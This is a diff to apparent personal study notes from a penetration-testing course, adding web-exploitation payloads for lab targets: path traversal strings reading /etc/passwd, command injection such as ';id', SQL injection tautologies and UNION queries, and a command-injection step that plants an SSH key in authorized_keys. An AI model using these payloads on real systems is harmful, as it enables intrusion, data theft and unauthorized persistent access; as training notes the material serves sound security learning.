@@ -33,6 +33,8 @@ nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-enum        
 nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-robots.txt    ##Tells you about Robots
 nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p139,445 --script=smb-os-discovery   ##Allows you to pull info from port 445 (smb is only for windows, the apache services are only on linux)
 
+Host Interrogation: nikto -h <tgt IP> (I don't think this is on my box)
+
 ssh student@<Grey Host IP> -L<RHP>:<tgt IP>:<tgt port> #The Tunneling method
 
 Control Sockets: 
@@ -87,8 +89,20 @@ Cookie Stealing (This will break the website): <?php
                                                ?>
                                                Malicious Injection script is in the spaghetti, just change the ip and port
 
+looking at files from a search bar (text box on website):
+../../../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../../../etc/group
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/networks
+../../../../../../../../../../../../../../etc/resolve.conf
+
 ----------
 Day 2 of Web Exploitation
+
+CMD Injection: ;id
+               ;whoami
+               ;cat
+
 We use MySQL -- Any googling needs to look only at this version of SQL
 Demo: cmd to remember --> select * from messages.comments;
       To pad columns in UNION --> select tireid,name,size,cost,5,6 FROM session.Tires UNION SELECT * from session.car;
@@ -119,6 +133,9 @@ Union Demo: Steps -  Do something legit and see what happens, does the URL chang
 Gold.txt {
 POST REQUESTS -- These go into text box
 
+<value>' OR 1='1
+<value>' OR 1='1;#
+
 UNION SELECT table_schema,2,table_name,column_name,5 FROM in
 formation_schema.columns;#
 
@@ -129,6 +146,9 @@ Audi'UNION SELECT tireid,2,name,cost,size FROM session.Tires;#
 
 GET REQUESTS -- These go into url
 
+url/something.php?Selection=1 or 1=1
+url/something.php?Selection=1 or 1=1;#
+
 Selection=2 UNION SELECT 1,2,3;#
 
 Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
@@ -136,6 +156,14 @@ Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_sc
 Selection=2 UNION SELECT carid,year,name FROM session.car;#
 }
 
+ssh injection: Generate SSH Keys on the host that we will be logging in with 
+               Place public key in /.ssh/authorized_keys on tgt box -> make the directories if you have to
+
+upload ssh public key: ;echo "<public key>" > /var/www/.ssh/authorized_keys   #If attacking personal box, place key in user's home directory
+                       ;cat /var/www/.ssh/authorized_keys
+
+cat /home/student/.ssh/id_rsa.pub
+if not here
 ---------------
 Reverse Engineering
 Words to Know: Heap - A "Heap" of memory to be allocated for use
@@ -372,3 +400,4 @@ Review:
                      Find a new box? You start back over at recon
 
 Dry Run IP: 10.50.28.45
+
